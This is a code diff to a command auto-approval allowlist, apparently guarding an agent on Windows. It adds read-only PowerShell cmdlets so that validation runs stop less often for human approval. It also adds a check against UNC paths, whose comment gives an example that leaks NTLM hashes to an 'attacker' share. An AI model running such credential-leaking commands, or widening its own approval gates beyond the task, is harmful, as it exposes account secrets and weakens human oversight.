@@ -57,6 +57,32 @@ export const DEFAULT_ALLOW = [
   "find",
   "grep",
   "echo",
+  // Windows. Everything above is Unix's list, and only dir/type/find/echo
+  // actually exist here — so on the platform this bridge runs on, that half was
+  // close to decorative. Two validation runs in a row stopped for a human on a
+  // command whose first word was a PowerShell cmdlet that could not have been
+  // on the list. These are the read-only ones: they print, they locate, they
+  // never write, delete or reach the network.
+  //
+  // This does not widen read access. `type C:\Users\...\.env` has been
+  // auto-approved since the list existed, so every file this process can read
+  // was already readable unattended; the additions only stop a human being
+  // woken for the same capability spelled the way this platform spells it.
+  "get-content",
+  "get-childitem",
+  "get-item",
+  "get-location",
+  "get-date",
+  "get-command",
+  "get-process",
+  "get-filehash",
+  "test-path",
+  "select-string",
+  "resolve-path",
+  "measure-object",
+  "compare-object",
+  "convertto-json",
+  "convertfrom-json",
 ];
 
 /**
@@ -86,6 +112,15 @@ export function autoApprove(command: string, allow: string[] = DEFAULT_ALLOW): {
 
   if (CHAINING.test(text)) {
     return { approved: false, reason: "命令包含串联、管道或重定向符号,无法只看首个子命令判断。" };
+  }
+
+  // The rule below only reads the command *name*. A UNC path in an argument —
+  // `type \\attacker\share\x` — reaches the network anyway: Windows resolves
+  // the name before the command runs, and that resolution hands the account's
+  // NTLM hash to whoever answered. A read-only command cannot otherwise produce
+  // an outbound credential, so the path gets its own check.
+  if (text.includes("\\\\")) {
+    return { approved: false, reason: "命令含 UNC 路径(\\\\),解析时会把本机账号的 NTLM 哈希发给对方。" };
   }
 
   const token = /^\s*"([^"]+)"|^\s*(\S+)/.exec(text);
